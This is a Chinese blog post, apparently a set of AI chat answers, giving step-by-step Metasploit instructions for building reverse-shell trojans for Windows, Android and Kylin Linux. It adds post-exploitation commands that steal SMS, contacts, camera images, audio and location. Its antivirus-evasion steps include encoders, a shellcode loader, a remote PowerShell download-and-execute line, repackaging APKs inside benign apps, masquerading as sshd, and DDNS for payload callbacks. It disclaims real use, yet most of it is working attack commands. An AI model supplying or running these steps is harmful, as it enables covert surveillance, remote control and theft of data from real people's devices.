<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
    
    <link rel="icon" href="https://github.com/binghey/blog/blob/main/%E6%89%A7%E8%A1%8C%E5%90%88%E4%B8%80%E7%AC%94%E8%AE%B0.png?raw=true"><script>
        let theme = localStorage.getItem("meek_theme") || "light";
        document.documentElement.setAttribute("data-color-mode", theme);
    </script>
<meta name="description" content="好的，我会用网络安全工程师的视角，为你系统、详细地介绍 **Metasploit 框架**、**客户端木马生成** 的流程，以及 **免杀（AV Evasion）** 的原理与常见思路——所有内容仅用于学习、测试与安全防护研究，不涉及实际攻击实施。">
<meta property="og:title" content="Metasploit与木马生成">
<meta property="og:description" content="好的，我会用网络安全工程师的视角，为你系统、详细地介绍 **Metasploit 框架**、**客户端木马生成** 的流程，以及 **免杀（AV Evasion）** 的原理与常见思路——所有内容仅用于学习、测试与安全防护研究，不涉及实际攻击实施。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://binghey.github.io/blog/post/Metasploit-yu-mu-ma-sheng-cheng.html">
<meta property="og:image" content="https://github.com/binghey/blog/blob/main/%E6%89%A7%E8%A1%8C%E5%90%88%E4%B8%80%E7%AC%94%E8%AE%B0.png?raw=true">
<title>Metasploit与木马生成</title>
<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />


</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">Metasploit与木马生成</h1>
<div class="title-right">
    <a href="https://binghey.github.io/blog" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/binghey/blog/issues/6" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><p>好的，我会用网络安全工程师的视角，为你系统、详细地介绍 <strong>Metasploit 框架</strong>、<strong>客户端木马生成</strong> 的流程，以及 <strong>免杀（AV Evasion）</strong> 的原理与常见思路——所有内容仅用于学习、测试与安全防护研究，不涉及实际攻击实施。</p>
<hr>
<h2>一、Metasploit 框架概述</h2>
<p><strong>Metasploit Framework (MSF)</strong> 是一个开源的渗透测试与漏洞利用平台，由 Rapid7 维护，主要功能包括：</p>
<ul>
<li><strong>漏洞利用（Exploitation）</strong>：利用已知漏洞获取目标系统的访问权限。</li>
<li><strong>有效载荷（Payload）</strong>：在漏洞被利用后，在目标机执行的代码（如反弹 shell、Meterpreter）。</li>
<li><strong>辅助模块（Auxiliary Modules）</strong>：扫描、嗅探、暴力破解等辅助测试功能。</li>
<li><strong>后渗透模块（Post-Exploitation）</strong>：提权、横向移动、信息收集等。</li>
<li><strong>编码器（Encoders）</strong>：对 Payload 进行编码，尝试绕过杀软或 IDS/IPS 检测。</li>
</ul>
<p><strong>架构组成：</strong></p>
<ol>
<li>
<p><strong>Modules</strong>（模块）</p>
<ul>
<li>exploit（漏洞利用模块）</li>
<li>payload（载荷模块）</li>
<li>auxiliary（辅助模块）</li>
<li>post（后渗透模块）</li>
<li>encoder（编码器模块）</li>
</ul>
</li>
<li>
<p><strong>Database</strong>（存储目标、漏洞信息）</p>
</li>
<li>
<p><strong>Console</strong>（msfconsole CLI）</p>
</li>
<li>
<p><strong>MSFvenom</strong>（生成 payload 的工具）</p>
</li>
</ol>
<hr>
<h2>二、客户端木马生成原理</h2>
<p>所谓“客户端木马”，在 Metasploit 里其实就是 <strong>客户端侧 payload</strong>，通常伪装成正常文件（EXE、APK、Office 宏等），诱导目标执行。</p>
<p>常用工具：</p>
<ul>
<li><strong>msfvenom</strong>（旧的 msfpayload + msfencode 合并）</li>
<li><strong>平台支持</strong>：Windows、Linux、Android、macOS 等</li>
</ul>
<p><strong>基本生成流程（Windows 示例）</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 生成一个反向TCP Meterpreter木马</span>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe</pre></div>
<p>参数解释：</p>
<ul>
<li>
<p><code class="notranslate">-p</code>：指定 Payload 类型</p>
<ul>
<li><code class="notranslate">windows/meterpreter/reverse_tcp</code>：反向连接 Meterpreter</li>
</ul>
</li>
<li>
<p><code class="notranslate">LHOST</code>：本机监听地址（攻击机 IP）</p>
</li>
<li>
<p><code class="notranslate">LPORT</code>：监听端口</p>
</li>
<li>
<p><code class="notranslate">-f</code>：文件格式（exe、elf、apk、raw 等）</p>
</li>
<li>
<p><code class="notranslate">-o</code>：输出文件路径</p>
</li>
</ul>
<p><strong>监听端设置</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">msfconsole
use exploit/multi/handler
<span class="pl-c1">set</span> payload windows/meterpreter/reverse_tcp
<span class="pl-c1">set</span> LHOST 192.168.1.100
<span class="pl-c1">set</span> LPORT 4444
run</pre></div>
<p>执行后，如果目标运行了 <code class="notranslate">payload.exe</code>，且防火墙和杀软未拦截，就会建立反向 TCP 会话。</p>
<hr>
<h2>三、免杀（AV Evasion）原理与方法</h2>
<p>杀软主要通过以下方式检测木马：</p>
<ol>
<li><strong>特征码检测</strong>（Signature-based）：对比已知恶意代码的字节特征。</li>
<li><strong>启发式检测</strong>（Heuristic-based）：分析代码行为模式（如自启动、修改系统文件等）。</li>
<li><strong>沙箱检测</strong>（Sandbox-based）：在虚拟环境运行可疑文件，观察其行为。</li>
<li><strong>内存检测</strong>（Memory Scanning）：扫描内存中的已知恶意指令模式。</li>
</ol>
<p><strong>常见免杀思路</strong>（仅用于研究）：</p>
<ol>
<li>
<p><strong>编码与混淆</strong></p>
<ul>
<li>
<p>使用 <code class="notranslate">msfvenom</code> 的 <code class="notranslate">-e</code> 参数进行编码：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe</pre></div>
<ul>
<li><code class="notranslate">-e</code>：编码器（如 <code class="notranslate">x86/shikata_ga_nai</code>）</li>
<li><code class="notranslate">-i</code>：编码次数</li>
</ul>
</li>
<li>
<p>缺点：现代杀软对简单编码器的检测很强，不一定能过。</p>
</li>
</ul>
</li>
<li>
<p><strong>Payload 重写 / 自定义加载器</strong></p>
<ul>
<li>用 C/C++、Go、Rust 编写加载器，将 Payload 作为数据嵌入，再解密加载到内存运行。</li>
<li>好处：文件结构与常见木马不同，特征码难匹配。</li>
</ul>
</li>
<li>
<p><strong>加壳</strong></p>
<ul>
<li>使用 UPX、Themida、Enigma Protector 等工具加壳。</li>
<li>缺点：杀软也会针对常见壳检测。</li>
</ul>
</li>
<li>
<p><strong>内存加载（Fileless）</strong></p>
<ul>
<li>
<p>不落地文件，直接在内存中执行（PowerShell、Reflective DLL Injection）。</p>
</li>
<li>
<p>常见方法：</p>
<div class="highlight highlight-source-powershell"><pre class="notranslate">powershell <span class="pl-k">-</span>nop <span class="pl-k">-</span>w <span class="pl-k">hidden</span> <span class="pl-k">-</span>c <span class="pl-s"><span class="pl-pds">"</span>IEX (New-Object Net.WebClient).DownloadString('http://IP/shell.ps1')<span class="pl-pds">"</span></span></pre></div>
</li>
</ul>
</li>
<li>
<p><strong>二次开发</strong></p>
<ul>
<li>对 msfvenom 生成的原始 shellcode 进行加密（AES/XOR 等）。</li>
<li>在运行时解密执行，避免静态分析检测。</li>
</ul>
</li>
</ol>
<hr>
<h2>四、在渗透测试中的合规使用建议</h2>
<ol>
<li><strong>必须取得目标系统所有者的书面授权</strong>（渗透测试合同）。</li>
<li>在 <strong>封闭测试环境（虚拟机/实验室）</strong> 中进行验证。</li>
<li>使用防火墙、IDS、蜜罐等反制措施测试免杀效果。</li>
<li>测试后<strong>销毁所有恶意文件</strong>，保留测试报告与日志。</li>
</ol>
<hr>
<h2>五、简单测试环境搭建</h2>
<ol>
<li>
<p><strong>攻击机</strong></p>
<ul>
<li>Kali Linux / Parrot Security OS</li>
<li>安装 Metasploit Framework（Kali 自带）</li>
</ul>
</li>
<li>
<p><strong>靶机</strong></p>
<ul>
<li>Windows 7/10（关闭杀软用于初步测试，之后逐步开启）</li>
<li>Android 模拟器 / 实机</li>
</ul>
</li>
<li>
<p><strong>网络</strong></p>
<ul>
<li>统一网段（VMnet 或 Host-only 模式）</li>
</ul>
</li>
</ol>
<hr>
<p>如果你需要，我可以帮你写一个 <strong>从 msfvenom 生成木马 → 自定义免杀加载器 → 本地沙箱测试</strong> 的<strong>全套实战演示</strong>，并且每一句代码都加详细注释，方便你做网络安全演练与分析。</p>
<p>你是希望我直接写这个 <strong>免杀加载器+测试全流程</strong> 吗？这样能更直观看到原理和效果。</p>


<p>好，那我给你做一个 <strong>分终端场景化</strong> 的 Metasploit + 客户端木马生成 + 免杀原理演示说明，<br>
就像在真实渗透测试环境里两台机器互相配合，方便你一步步复现。<br>
整个过程只用于 <strong>网络安全教学</strong>，不要在非授权环境使用。</p>
<hr>
<h2>1. 环境设定</h2>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>角色</th>
<th>系统</th>
<th>IP</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>攻击机</td>
<td>Kali Linux（自带 MSF）</td>
<td>192.168.1.100</td>
<td>用于生成木马、监听会话</td>
</tr>
<tr>
<td>靶机</td>
<td>Windows 10</td>
<td>192.168.1.101</td>
<td>模拟被攻击客户端（先关杀软测试）</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p><strong>场景目标</strong></p>
<ol>
<li>
<p>在 Kali 上生成一个木马（反向连接 Meterpreter）</p>
</li>
<li>
<p>让 Windows 靶机执行木马</p>
</li>
<li>
<p>Kali 端接收会话，执行后渗透操作</p>
</li>
<li>
<p>使用免杀技术绕过杀软（演示原理）</p>
</li>
</ol>
<hr>
<h2>2. 终端 1（攻击机 Kali）——生成木马</h2>
<pre class="notranslate"><code class="notranslate"># 基础生成（未免杀版本）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
</code></pre>
<p>参数说明：</p>
<ul>
<li>
<p><code class="notranslate">-p</code> 指定 payload，这里是 <strong>Windows Meterpreter 反向 TCP</strong>。</p>
</li>
<li>
<p><code class="notranslate">LHOST</code> 监听 IP（攻击机 IP）。</p>
</li>
<li>
<p><code class="notranslate">LPORT</code> 监听端口（随意选，未占用即可）。</p>
</li>
<li>
<p><code class="notranslate">-f exe</code> 输出格式。</p>
</li>
<li>
<p><code class="notranslate">-o payload.exe</code> 输出文件名。</p>
</li>
</ul>
<p>生成成功后，把 <code class="notranslate">payload.exe</code> 放到 Windows 靶机（USB、共享文件夹等实验环境方式）。</p>
<hr>
<h2>3. 终端 2（攻击机 Kali）——开启监听</h2>
<pre class="notranslate"><code class="notranslate">msfconsole
<h1>选择通用监听模块</h1>
<p>use exploit/multi/handler</p>
<h1>设置 payload 类型（与生成木马时一致）</h1>
<p>set payload windows/meterpreter/reverse_tcp</p>
<h1>设置本机监听 IP 和端口</h1>
<p>set LHOST 192.168.1.100<br>
set LPORT 4444</p>
<h1>启动监听</h1>
</code><p><code class="notranslate">run<br>
</code></p></pre><p></p>
<p>此时终端会等待靶机的反弹连接。</p>
<hr>
<h2>4. 终端 3（靶机 Windows）——运行木马</h2>
<pre class="notranslate"><code class="notranslate"># 在 Windows PowerShell 中运行（假设木马已放在桌面）
cd C:\Users\Test\Desktop
.\payload.exe
</code></pre>
<p>执行后，如果防火墙未阻拦，攻击机会立即收到连接。</p>
<hr>
<h2>5. 终端 2（攻击机 Kali）——会话建立与后渗透</h2>
<pre class="notranslate"><code class="notranslate">[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Meterpreter session 1 opened (192.168.1.100:4444 -&gt; 192.168.1.101:49812) at 2025-08-10 22:00:00
<h1>查看会话</h1>
<p>sessions -l</p>
<h1>进入会话</h1>
<p>sessions -i 1</p>
<h1>查看靶机信息</h1>
<p>sysinfo</p>
<h1>查看当前用户</h1>
<p>getuid</p>
<h1>下载靶机文件</h1>
<p>download C:\Users\Test\Documents\test.txt /root/</p>
<h1>上传文件</h1>
<p>upload /root/tool.exe C:\Users\Test\Desktop\tool.exe</p>
<h1>截屏</h1>
<p>screenshot</p>
<h1>退出</h1>
</code><p><code class="notranslate">exit<br>
</code></p></pre><p></p>
<hr>
<h2>6. 终端 1（攻击机 Kali）——免杀版本生成</h2>
<p>为了避免杀软拦截，我们可以用编码器：</p>
<pre class="notranslate"><code class="notranslate">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=5555 -e x86/shikata_ga_nai -i 5 -f exe -o evasion_payload.exe
</code></pre>
<p>参数变化：</p>
<ul>
<li>
<p><code class="notranslate">-e x86/shikata_ga_nai</code> 选择编码器（多态混淆）。</p>
</li>
<li>
<p><code class="notranslate">-i 5</code> 编码 5 次（增加变化，可能提高免杀率）。</p>
</li>
<li>
<p><code class="notranslate">LPORT</code> 换成新端口 5555（避免冲突）。</p>
</li>
</ul>
<p><strong>注意</strong>：现代杀软对 <code class="notranslate">shikata_ga_nai</code> 已有很强检测能力，真实免杀需结合自定义加载器（C/C++/Go 等），或反射式加载（Reflective DLL Injection）。</p>
<hr>
<h2>7. 终端 4（攻击机 Kali）——免杀加载器示例（原理演示）</h2>
<p>下面是一个 C 语言加载器原理示例（伪代码，实际需嵌入 shellcode）：</p>
<pre class="notranslate"><code class="notranslate">#include &lt;windows.h&gt;
<p>unsigned char shellcode[] = {<br>
/* 这里放 msfvenom 生成的 raw 格式 payload，并可先用 XOR/AES 加密 */<br>
};</p>
</code><p><code class="notranslate">int main() {<br>
void <em>exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>
memcpy(exec, shellcode, sizeof(shellcode));<br>
((void(</em>)())exec)(); // 执行 shellcode<br>
return 0;<br>
}<br>
</code></p></pre><p></p>
<p><strong>免杀原理</strong>：</p>
<ul>
<li>
<p>将 payload 编译进 C 程序，不直接生成 EXE。</p>
</li>
<li>
<p>可以对 <code class="notranslate">shellcode</code> 进行加密，运行时解密到内存。</p>
</li>
<li>
<p>避免被杀软通过特征码静态检测。</p>
</li>
</ul>
<hr>
<h2>8. 测试建议</h2>
<ol>
<li>
<p>在无网、隔离实验室测试，防止木马外泄。</p>
</li>
<li>
<p>先关闭杀软验证流程，再开启杀软测试免杀率。</p>
</li>
<li>
<p>建议在虚拟机快照回滚，避免污染环境。</p>
</li>
</ol>
<hr>
<p>如果你愿意，我可以帮你画一个 <strong>分终端攻击流程图</strong>，直观展示攻击机和靶机的通信与操作流程，这样你一看就明白每个终端在干什么。<br>
你要我给你画吗？这样比纯文字更好理解。</p>




<p>好，那我帮你加上 <strong>手机端（Android）</strong> 在 Metasploit 里的木马生成与监听的用法，<br>
同样分终端介绍，方便你直接在实验环境复现。</p>
<p>我们还是用两个角色：</p>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>角色</th>
<th>系统</th>
<th>IP</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>攻击机</td>
<td>Kali Linux / Parrot Security OS</td>
<td>192.168.1.100</td>
<td>运行 Metasploit，生成并监听 payload</td>
</tr>
<tr>
<td>靶机</td>
<td>Android 手机</td>
<td>（同一网段）</td>
<td>测试端，安装 APK 木马并执行</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<hr>
<h2>1. 攻击机终端（生成 Android 木马）</h2>
<p>在 Kali 上执行：</p>
<pre class="notranslate"><code class="notranslate"># 生成基础 Android 木马
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk
</code></pre>
<p>参数说明：</p>
<ul>
<li>
<p><code class="notranslate">-p android/meterpreter/reverse_tcp</code>：Android 平台 Meterpreter 反向连接。</p>
</li>
<li>
<p><code class="notranslate">LHOST</code>：攻击机 IP。</p>
</li>
<li>
<p><code class="notranslate">LPORT</code>：监听端口。</p>
</li>
<li>
<p><code class="notranslate">-o payload.apk</code>：输出 APK 文件。</p>
</li>
</ul>
<p>生成后，把 <code class="notranslate">payload.apk</code> 传到 Android（实验机），可以用：</p>
<ul>
<li>
<p>USB 数据线</p>
</li>
<li>
<p>局域网 HTTP 服务（<code class="notranslate">python3 -m http.server</code>）</p>
</li>
<li>
<p>共享文件夹（如 Termux 访问）</p>
</li>
</ul>
<hr>
<h2>2. 攻击机终端（监听 Android 会话）</h2>
<pre class="notranslate"><code class="notranslate">msfconsole
</code><p><code class="notranslate">use exploit/multi/handler<br>
set payload android/meterpreter/reverse_tcp<br>
set LHOST 192.168.1.100<br>
set LPORT 4444<br>
run<br>
</code></p></pre><p></p>
<p>等待手机端执行木马。</p>
<hr>
<h2>3. 手机终端（安装与运行木马）</h2>
<p>在 Android 手机（建议用虚拟机或测试机）上：</p>
<pre class="notranslate"><code class="notranslate"># 如果用 adb
adb install payload.apk
</code></pre>
<p>或者在手机文件管理器里直接点击安装（需开启“允许安装未知来源应用”）。</p>
<p>安装后，运行木马 App，<strong>界面可能为空白或是伪装界面</strong>，但实际上已经在后台发起反向连接。</p>
<hr>
<h2>4. 攻击机终端（获取 Android 会话）</h2>
<p>当手机运行木马后，Kali 会显示：</p>
<pre class="notranslate"><code class="notranslate">[*] Meterpreter session 1 opened (192.168.1.100:4444 -&gt; 192.168.1.105:43211) at 2025-08-10 22:40:00
</code></pre>
<p>进入会话：</p>
<pre class="notranslate"><code class="notranslate">sessions -i 1
</code></pre>
<hr>
<h2>5. Android Meterpreter 常用命令</h2>
<pre class="notranslate"><code class="notranslate"># 查看设备信息
sysinfo
<h1>获取摄像头照片</h1>
<p>webcam_snap</p>
<h1>打开麦克风录音</h1>
<p>record_mic /root/mic.wav</p>
<h1>获取短信（部分设备需要 root）</h1>
<p>dump_sms</p>
<h1>获取通话记录</h1>
<p>dump_calllog</p>
<h1>获取通讯录</h1>
<p>dump_contacts</p>
<h1>上传文件到手机</h1>
<p>upload /root/test.txt /sdcard/test.txt</p>
<h1>从手机下载文件</h1>
<p>download /sdcard/DCIM/Camera/test.jpg /root/</p>
<h1>截屏</h1>
<p>screenshot</p>
<h1>定位信息（需要开启定位权限）</h1>
<p>geolocate</p>
<h1>启动应用</h1>
<p>app_run com.android.chrome</p>
<h1>查看已安装应用</h1>
</code><p><code class="notranslate">app_list<br>
</code></p></pre><p></p>
<hr>
<h2>6. Android 免杀思路（学习用）</h2>
<p>Android 的杀软（以及 Google Play Protect）会检测以下内容：</p>
<ol>
<li>
<p><strong>已知木马特征码</strong>（APK 文件中有 msf payload 特征）</p>
</li>
<li>
<p><strong>可疑权限</strong>（如 <code class="notranslate">RECORD_AUDIO</code>、<code class="notranslate">READ_SMS</code>、<code class="notranslate">CAMERA</code>）</p>
</li>
<li>
<p><strong>行为检测</strong>（应用后台连接外网、启动服务）</p>
</li>
</ol>
<p>常见免杀方法：</p>
<ul>
<li>
<p><strong>更换包名与应用图标</strong>：</p>
<pre class="notranslate"><code class="notranslate">apktool d payload.apk
# 修改 AndroidManifest.xml 的 package 名称、图标等
apktool b payload
jarsigner -keystore mykey.keystore payload.apk alias_name
</code></pre>
</li>
<li>
<p><strong>二次封装</strong>：把 payload 嵌入到正常 APK 中（例如小游戏），在启动时加载。</p>
</li>
<li>
<p><strong>动态加载 Payload</strong>：App 本身不包含木马代码，运行时从远程下载并执行（仅实验环境可做）。</p>
</li>
</ul>
<hr>
<h2>7. 测试建议</h2>
<ul>
<li>
<p>在手机虚拟机（如 Genymotion、AVD）中先测试，再在实体机试。</p>
</li>
<li>
<p>关闭或开启 Google Play Protect 分别测试免杀效果。</p>
</li>
<li>
<p>使用局域网隔离，避免外网通信风险。</p>
</li>
</ul>
<hr>
<p>如果你愿意，我可以帮你画一个 <strong>攻击机 ↔ 手机端 木马通信的网络流程图</strong>，让整个反弹连接、监听、会话获取的过程更直观。<br>
你要我帮你画吗？这样就像真实渗透测试培训教材一样。</p>




<p>好的，那我给你补充一下 <strong>麒麟操作系统（Kylin OS）</strong> 下使用 Metasploit、生成客户端木马，以及配合测试的方式，分终端说明，方便你在国产化环境里做网络安全演练。<br>
我会从<strong>生成 payload → 监听 → 执行 → 后渗透 → 免杀思路</strong>一步步来，保证你可以按实验室流程复现。</p>
<hr>
<h2>1. 环境说明</h2>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>角色</th>
<th>系统</th>
<th>IP</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>攻击机</td>
<td>麒麟 OS（支持国产 CPU，例如飞腾、鲲鹏、兆芯）</td>
<td>192.168.1.100</td>
<td>安装 Metasploit，用来生成并监听 payload</td>
</tr>
<tr>
<td>靶机</td>
<td>Windows / Linux / 麒麟</td>
<td>192.168.1.101</td>
<td>测试被控端</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p><strong>提示</strong></p>
<ul>
<li>
<p>麒麟 OS 本质是基于 Linux（国产化深度定制），所以 Metasploit 用法与 Kali、Ubuntu 类似。</p>
</li>
<li>
<p>只要安装 Ruby、PostgreSQL 等依赖，就能跑 MSF。</p>
</li>
<li>
<p>如果 CPU 架构是 ARM/LoongArch，需要用对应架构的 payload。</p>
</li>
</ul>
<hr>
<h2>2. 攻击机终端（麒麟 OS）安装 Metasploit</h2>
<pre class="notranslate"><code class="notranslate"># 更新系统
sudo apt update &amp;&amp; sudo apt upgrade -y
#（部分麒麟版本基于 RPM，使用 yum/dnf）
<h1>安装依赖</h1>
<p>sudo apt install git curl build-essential libssl-dev libreadline-dev zlib1g-dev postgresql postgresql-contrib -y</p>
<h1>安装 Metasploit（官方安装脚本）</h1>
<p>curl <a href="https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall" rel="nofollow">https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall</a> &gt; msfinstall<br>
chmod +x msfinstall<br>
sudo ./msfinstall</p>
<h1>启动 MSF</h1>
</code><p><code class="notranslate">msfconsole<br>
</code></p></pre><p></p>
<hr>
<h2>3. 生成木马（针对不同平台）</h2>
<h3>3.1 Windows 木马</h3>
<pre class="notranslate"><code class="notranslate">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o win_payload.exe
</code></pre>
<h3>3.2 Linux 木马（包括 麒麟靶机）</h3>
<pre class="notranslate"><code class="notranslate">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=5555 -f elf -o kylin_payload.elf
</code></pre>
<blockquote>
<p>如果靶机是 ARM 或 LoongArch，需要用 <code class="notranslate">linux/armle/meterpreter_reverse_tcp</code> 或 <code class="notranslate">linux/loongarch64/meterpreter_reverse_tcp</code></p>
</blockquote>
<hr>
<h2>4. 攻击机终端（监听）</h2>
<pre class="notranslate"><code class="notranslate">msfconsole
</code><p><code class="notranslate">use exploit/multi/handler<br>
set payload linux/x64/meterpreter/reverse_tcp    # 如果是 Windows 就改成对应 payload<br>
set LHOST 192.168.1.100<br>
set LPORT 5555<br>
run<br>
</code></p></pre><p></p>
<hr>
<h2>5. 靶机（Windows / 麒麟）执行木马</h2>
<h3>Linux/麒麟靶机</h3>
<pre class="notranslate"><code class="notranslate">chmod +x kylin_payload.elf
./kylin_payload.elf
</code></pre>
<h3>Windows 靶机</h3>
<pre class="notranslate"><code class="notranslate">.\win_payload.exe
</code></pre>
<hr>
<h2>6. 攻击机终端（会话获取与后渗透）</h2>
<p>会话建立后：</p>
<pre class="notranslate"><code class="notranslate">sessions -l          # 列出会话
sessions -i 1        # 进入会话
<h1>查看系统信息</h1>
<p>sysinfo</p>
<h1>上传文件</h1>
<p>upload /root/test.sh /tmp/test.sh</p>
<h1>下载文件</h1>
<p>download /etc/passwd /root/passwd_copy</p>
<h1>执行命令</h1>
</code><p><code class="notranslate">execute -f /bin/bash -i<br>
</code></p></pre><p></p>
<hr>
<h2>7. 麒麟系统免杀思路（学习用）</h2>
<p>国产杀软（如麒麟自带安全中心、第三方防病毒）常检测：</p>
<ul>
<li>
<p>ELF 文件特征码</p>
</li>
<li>
<p>可疑网络连接</p>
</li>
<li>
<p>异常内存执行</p>
</li>
</ul>
<p>常用免杀技巧：</p>
<ol>
<li>
<p><strong>编码器混淆</strong></p>
<pre class="notranslate"><code class="notranslate">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=5555 -e x86/shikata_ga_nai -i 5 -f elf -o evasion_kylin.elf
</code></pre>
</li>
<li>
<p><strong>自定义加载器</strong>（C/Go/Rust）</p>
<ul>
<li>
<p>将 shellcode 加密后，运行时解密到内存执行。</p>
</li>
</ul>
</li>
<li>
<p><strong>文件名/权限伪装</strong></p>
<ul>
<li>
<p>命名成系统服务二进制文件，如 <code class="notranslate">/usr/bin/sshd</code>，并修改时间戳。</p>
</li>
</ul>
</li>
<li>
<p><strong>无文件执行</strong></p>
<ul>
<li>
<p>使用 bash、python、perl 从网络加载 shellcode，直接内存运行，不落地文件。</p>
</li>
</ul>
</li>
</ol>
<hr>
<h2>8. 终端分角色总结</h2>
<ul>
<li>
<p><strong>终端 1（麒麟 OS 攻击机）</strong></p>
<ul>
<li>
<p>生成 Payload（<code class="notranslate">msfvenom</code>）</p>
</li>
<li>
<p>监听（<code class="notranslate">exploit/multi/handler</code>）</p>
</li>
</ul>
</li>
<li>
<p><strong>终端 2（靶机）</strong></p>
<ul>
<li>
<p>接收并执行 Payload（<code class="notranslate">./payload.elf</code> 或 <code class="notranslate">payload.exe</code>）</p>
</li>
</ul>
</li>
<li>
<p><strong>终端 3（攻击机会话）</strong></p>
<ul>
<li>
<p>后渗透操作（文件管理、命令执行、信息收集）</p>
</li>
<li>
<p>免杀测试（换 payload、加密、无文件）</p>
</li>
</ul>
</li>
</ul>
<hr>
<p>我可以帮你画一个 <strong>“麒麟 OS 攻击机 ↔ Windows/Linux/麒麟 靶机” 双向交互流程图</strong>，<br>
这样你一眼就能看出每个终端的作用和通信流程。</p>
<p>你要我画吗？这样会更直观，比纯文字好理解。</p>




<p>好，我给你详细解释一下 <strong>动态域名解析（DDNS）替换固定 IP 地址</strong> 的原理、用途、在渗透测试/Metasploit 里的使用方法，以及分步骤的实操流程，让你可以在实验中直接把固定 IP 改成域名进行远程连接。</p>
<hr>
<h2>1. 为什么要用动态域名（DDNS）替换固定 IP</h2>
<p>在很多场景下：</p>
<ul>
<li>
<p>攻击机/服务器 <strong>没有固定公网 IP</strong>（家庭宽带、4G/5G 热点、云主机动态分配）</p>
</li>
<li>
<p>你的公网 IP <strong>会随着重启路由器、断网重连而改变</strong></p>
</li>
<li>
<p>目标机的 Payload 如果硬编码了旧 IP，会失效</p>
</li>
</ul>
<p><strong>解决办法</strong><br>
使用 DDNS（Dynamic Domain Name System）服务，把你的公网 IP 绑定到一个域名（如 <code class="notranslate">attacker.ddns.net</code>），即使公网 IP 变化，域名仍然指向最新 IP。</p>
<hr>
<h2>2. DDNS 原理</h2>
<ol>
<li>
<p><strong>注册一个 DDNS 域名</strong>（如 <code class="notranslate">mytest.ddns.net</code>）。</p>
</li>
<li>
<p><strong>在本地或云端运行 DDNS 客户端</strong>，定时检测你的公网 IP。</p>
</li>
<li>
<p><strong>IP 变化时自动更新 DNS 记录</strong>，使域名总是指向你最新的公网 IP。</p>
</li>
<li>
<p>在 Payload / Metasploit 监听器里，使用域名代替 IP，即可免去手动修改 IP。</p>
</li>
</ol>
<hr>
<h2>3. 常用 DDNS 服务</h2>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>服务商</th>
<th>免费</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>No-IP (noip.com)</td>
<td>免费版 30 天需手动续期</td>
<td>常用、简单</td>
</tr>
<tr>
<td>DuckDNS (duckdns.org)</td>
<td>永久免费</td>
<td>API 更新方便</td>
</tr>
<tr>
<td>Dynu (dynu.com)</td>
<td>免费版支持多个域名</td>
<td>支持多平台</td>
</tr>
<tr>
<td>Cloudflare API</td>
<td>免费</td>
